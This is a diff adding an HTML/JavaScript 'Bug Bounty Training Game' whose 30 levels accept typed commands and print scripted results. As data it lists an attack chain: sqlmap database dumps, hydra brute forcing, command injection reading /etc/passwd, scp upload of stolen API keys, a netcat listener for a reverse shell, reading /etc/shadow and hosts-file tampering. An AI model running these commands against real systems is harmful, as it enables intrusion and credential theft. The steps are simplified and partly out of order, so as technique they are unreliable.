@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Bounty Training Game</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+        }
+        #game {
+            white-space: pre-wrap;
+        }
+        input[type="text"] {
+            background-color: #121212;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            width: 100%;
+            padding: 5px;
+            font-family: monospace;
+            font-size: 1em;
+        }
+    </style>
+</head>
+<body>
+    <h1>Bug Bounty Training Game 🐞</h1>
+    <pre id="game">Initializing Bug Bounty Training...\n\nBackstory: You are a talented security researcher ready to uncover vulnerabilities in various web applications. Your mission is to complete 30 levels of challenges, using your skills to find and exploit bugs while documenting your findings for a potential bounty. Let's get started!\n\n</pre>
+    <input type="text" id="input" autofocus>
+
+    <script>
+        const gameText = document.getElementById('game');
+        const inputField = document.getElementById('input');
+        let level = 1;
+
+        // Function to display text in the game
+        function displayText(text) {
+            gameText.textContent += text + '\n';
+        }
+
+        // Function to clear input
+        function clearInput() {
+            inputField.value = '';
+        }
+
+        // Game logic
+        function handleCommand(command) {
+            switch (level) {
+                case 1:
+                    if (command === 'nmap 192.168.1.1') {
+                        displayText('[+] Scanning target...\n[+] Open ports found: 80, 443\nLevel 2: Use "nikto -h http://192.168.1.1" to scan for vulnerabilities.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "nmap 192.168.1.1".');
+                    }
+                    break;
+                case 2:
+                    if (command === 'nikto -h http://192.168.1.1') {
+                        displayText('[+] Nikto scan results:\n[+] Found outdated server version!\nLevel 3: Use "curl -I http://192.168.1.1" to check HTTP headers.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "nikto -h http://192.168.1.1".');
+                    }
+                    break;
+                case 3:
+                    if (command === 'curl -I http://192.168.1.1') {
+                        displayText('[+] Checking HTTP headers...\n[+] Found "X-Content-Type-Options" missing!\nLevel 4: Use "burpsuite" to intercept requests.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "curl -I http://192.168.1.1".');
+                    }
+                    break;
+                case 4:
+                    if (command === 'burpsuite') {
+                        displayText('[+] Burp Suite opened.\n[+] Intercepting requests to identify vulnerabilities.\nLevel 5: Use "sqlmap -u http://192.168.1.1/login" to test for SQL injection.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "burpsuite".');
+                    }
+                    break;
+                case 5:
+                    if (command.startsWith('sqlmap -u')) {
+                        displayText('[+] Running SQLMap...\n[+] Found SQL injection vulnerability!\nLevel 6: Use "sqlmap -u http://192.168.1.1/login --dump" to retrieve data.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "sqlmap -u http://192.168.1.1/login".');
+                    }
+                    break;
+                case 6:
+                    if (command === 'sqlmap -u http://192.168.1.1/login --dump') {
+                        displayText('[+] Data retrieved from database:\n[+] User: admin, Password: admin123\nLevel 7: Use "hydra -l admin -P /path/to/passwords.txt http://192.168.1.1/login" to brute force the login.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "sqlmap -u http://192.168.1.1/login --dump".');
+                    }
+                    break;
+                case 7:
+                    if (command.startsWith('hydra -l admin')) {
+                        displayText('[+] Running Hydra...\n[+] Successful login as admin!\nLevel 8: Use "curl -X POST -d "param=value" http://192.168.1.1/admin" to access the admin panel.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "hydra -l admin -P /path/to/passwords.txt http://192.168.1.1/login".');
+                    }
+                    break;
+                case 8:
+                    if (command.startsWith('curl -X POST')) {
+                        displayText('[+] Accessing admin panel...\n[+] Vulnerable parameter found!\nLevel 9: Use "curl -X POST -d "cmd=cat /etc/passwd" http://192.168.1.1/admin" to execute commands.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "curl -X POST -d "param=value" http://192.168.1.1/admin".');
+                    }
+                    break;
+                case 9:
+                    if (command.startsWith('curl -X POST -d "cmd=cat /etc/passwd"')) {
+                        displayText('[+] Executing command...\n[+] User list retrieved from /etc/passwd!\nLevel 10: Use "curl -X GET http://192.168.1.1/sensitive_data" to access sensitive data.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "curl -X POST -d "cmd=cat /etc/passwd" http://192.168.1.1/admin".');
+                    }
+                    break;
+                case 10:
+                    if (command === 'curl -X GET http://192.168.1.1/sensitive_data') {
+                        displayText('[+] Accessing sensitive data...\n[+] Found API keys and user credentials!\nLevel 11: Use "echo "API_KEY=abc123" > api_keys.txt" to save the data.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "curl -X GET http://192.168.1.1/sensitive_data".');
+                    }
+                    break;
+                case 11:
+                    if (command === 'echo "API_KEY=abc123" > api_keys.txt') {
+                        displayText('[+] API keys saved!\nLevel 12: Use "scp api_keys.txt user@remote.server:/path/to/directory" to upload the file.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "echo "API_KEY=abc123" > api_keys.txt".');
+                    }
+                    break;
+                case 12:
+                    if (command.startsWith('scp api_keys.txt')) {
+                        displayText('[+] Uploading API keys...\n[+] Keys uploaded successfully!\nLevel 13: Use "wget http://192.168.1.1/vulnerable_file" to download a vulnerable file.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "scp api_keys.txt user@remote.server:/path/to/directory".');
+                    }
+                    break;
+                case 13:
+                    if (command === 'wget http://192.168.1.1/vulnerable_file') {
+                        displayText('[+] Downloading vulnerable file...\n[+] File downloaded!\nLevel 14: Use "unzip vulnerable_file.zip" to extract it.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "wget http://192.168.1.1/vulnerable_file".');
+                    }
+                    break;
+                case 14:
+                    if (command === 'unzip vulnerable_file.zip') {
+                        displayText('[+] Extracting files...\n[+] Found exploitable scripts!\nLevel 15: Use "chmod +x exploit.sh" to make the script executable.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "unzip vulnerable_file.zip".');
+                    }
+                    break;
+                case 15:
+                    if (command === 'chmod +x exploit.sh') {
+                        displayText('[+] Script is now executable!\nLevel 16: Use "./exploit.sh" to run the exploit.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "chmod +x exploit.sh".');
+                    }
+                    break;
+                case 16:
+                    if (command === './exploit.sh') {
+                        displayText('[+] Running exploit...\n[+] Gained a reverse shell!\nLevel 17: Use "nc -lvp 4444" to listen for incoming connections.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "./exploit.sh".');
+                    }
+                    break;
+                case 17:
+                    if (command === 'nc -lvp 4444') {
+                        displayText('[+] Listening for connections...\n[+] Connection established!\nLevel 18: Use "whoami" to check your privileges.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "nc -lvp 4444".');
+                    }
+                    break;
+                case 18:
+                    if (command === 'whoami') {
+                        displayText('[+] You are now root!\nLevel 19: Use "cat /etc/shadow" to read hashed passwords.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "whoami".');
+                    }
+                    break;
+                case 19:
+                    if (command === 'cat /etc/shadow') {
+                        displayText('[+] Hashed passwords retrieved!\nLevel 20: Use "john --wordlist=/path/to/wordlist.txt hash.txt" to crack passwords.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "cat /etc/shadow".');
+                    }
+                    break;
+                case 20:
+                    if (command.startsWith('john --wordlist=')) {
+                        displayText('[+] Cracking passwords...\n[+] Passwords cracked successfully!\nLevel 21: Use "sudo -u admin -s" to switch to the admin user.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "john --wordlist=/path/to/wordlist.txt hash.txt".');
+                    }
+                    break;
+                case 21:
+                    if (command === 'sudo -u admin -s') {
+                        displayText('[+] Switched to admin user!\nLevel 22: Use "nano /etc/hosts" to modify the hosts file.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "sudo -u admin -s".');
+                    }
+                    break;
+                case 22:
+                    if (command === 'nano /etc/hosts') {
+                        displayText('[+] Opening hosts file...\n[+] Modify the file to redirect traffic!\nLevel 23: Use "echo "127.0.0.1 evilsite.com" >> /etc/hosts" to redirect a site.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "nano /etc/hosts".');
+                    }
+                    break;
+                case 23:
+                    if (command === 'echo "127.0.0.1 evilsite.com" >> /etc/hosts') {
+                        displayText('[+] Site redirected!\nLevel 24: Use "curl http://evilsite.com" to verify redirection.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "echo "127.0.0.1 evilsite.com" >> /etc/hosts".');
+                    }
+                    break;
+                case 24:
+                    if (command === 'curl http://evilsite.com') {
+                        displayText('[+] Verifying redirection...\n[+] Successfully redirected to local server!\nLevel 25: Use "systemctl restart apache2" to restart the web server.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "curl http://evilsite.com".');
+                    }
+                    break;
+                case 25:
+                    if (command === 'systemctl restart apache2') {
+                        displayText('[+] Web server restarted!\nLevel 26: Use "service nginx start" to start Nginx server.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "systemctl restart apache2".');
+                    }
+                    break;
+                case 26:
+                    if (command === 'service nginx start') {
+                        displayText('[+] Nginx server started!\nLevel 27: Use "netstat -tuln" to check open ports.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "service nginx start".');
+                    }
+                    break;
+                case 27:
+                    if (command === 'netstat -tuln') {
+                        displayText('[+] Checking open ports...\n[+] Found services running!\nLevel 28: Use "iptables -L" to check firewall rules.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "netstat -tuln".');
+                    }
+                    break;
+                case 28:
+                    if (command === 'iptables -L') {
+                        displayText('[+] Checking firewall rules...\n[+] Found rules allowing traffic!\nLevel 29: Use "traceroute example.com" to check the route to a target.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "iptables -L".');
+                    }
+                    break;
+                case 29:
+                    if (command === 'traceroute example.com') {
+                        displayText('[+] Tracing route to example.com...\n[+] Successfully traced!\nLevel 30: Use "echo "Bug bounty report completed!" > report.txt" to finalize your report.');
+                        levelUp();
+                    } else {
+                        displayText('Unknown command. Try "traceroute example.com".');
+                    }
+                    break;
+                case 30:
+                    if (command === 'echo "Bug bounty report completed!" > report.txt') {
+                        displayText('[+] Report finalized!\n[+] You have successfully completed the Bug Bounty Training!\nCongratulations!');
+                    } else {
+                        displayText('Unknown command. Try "echo "Bug bounty report completed!" > report.txt".');
+                    }
+                    break;
+                default:
+                    displayText('You have completed all levels!');
+            }
+            clearInput();
+        }
+
+        // Level-up function
+        function levelUp() {
+            level++;
+            displayText(`Level ${level} unlocked!`);
+        }
+
+        // Event listener for input
+        inputField.addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                const command = inputField.value.trim();
+                handleCommand(command);
+            }
+        });
+    </script>
+</body>
+</html>
+
+               
+                  
+            
